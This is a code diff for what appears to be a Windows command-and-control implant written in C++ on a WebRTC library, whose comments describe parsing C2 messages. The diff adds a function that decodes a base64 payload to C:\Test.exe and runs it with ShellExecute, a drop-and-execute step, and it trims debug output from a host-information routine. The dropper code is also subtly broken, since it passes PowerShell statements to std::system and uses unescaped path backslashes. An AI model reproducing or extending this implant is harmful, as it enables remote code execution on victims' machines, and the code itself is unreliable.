@@ -37,6 +37,7 @@
 #include <unordered_map>
 
 #include <windows.h>
+#include <ShellAPI.h>
 
 
 using namespace rtc;
@@ -56,25 +57,33 @@ shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
                                                 weak_ptr<WebSocket> wws, string id);
 string randomId(size_t length);
 
+
+/***
+* createFileFromBase | Creates a binary from a base64 string
+***/
+void createFileFromBase64String(string stringFile) {
+	const char* secondCmd =
+	    "[IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($B64String))";
+
+	std::string firstCmd = "$B64String = '" + stringFile + "'";
+	std::system(firstCmd.c_str());
+
+	std::system("$FileName = 'C:\Test.exe'");
+
+	std::system(secondCmd);
+	cout << "TEST COMPLETED**" << endl;
+	ShellExecute(NULL, "open", "C:\Test.exe", NULL, NULL, SW_SHOWDEFAULT);
+	cout << "TEST COMPLETED***" << endl;
+}
+
+/***
+* getSystemInfo | Performs calls to WindowsAPI functions to retrieve hardware and software information
+***/
 SYSTEM_INFO getSystemInfo(string data) {
 	SYSTEM_INFO siSysInfo;
 
    // Copy the hardware information to the SYSTEM_INFO structure. 
    GetSystemInfo(&siSysInfo); 
-
-   // Display the contents of the SYSTEM_INFO structure for Testing
-   printf("Hardware information: \n");  
-   printf("  OEM ID: %u\n", siSysInfo.dwOemId);
-   printf("  Number of processors: %u\n", 
-      siSysInfo.dwNumberOfProcessors); 
-   printf("  Page size: %u\n", siSysInfo.dwPageSize); 
-   printf("  Processor type: %u\n", siSysInfo.dwProcessorType); 
-   printf("  Minimum application address: %lx\n", 
-      siSysInfo.lpMinimumApplicationAddress); 
-   printf("  Maximum application address: %lx\n", 
-      siSysInfo.lpMaximumApplicationAddress); 
-   printf("  Active processor mask: %u\n", 
-      siSysInfo.dwActiveProcessorMask);
 	   
    return siSysInfo;
 }
@@ -82,7 +91,6 @@ SYSTEM_INFO getSystemInfo(string data) {
 /***
 * Interprets messages from the C2 (Verify, Decrypt, Process) and creates an answer to send to the C2s
 ***/
-
 string parseMessage(string message) {
 
 	//Commands
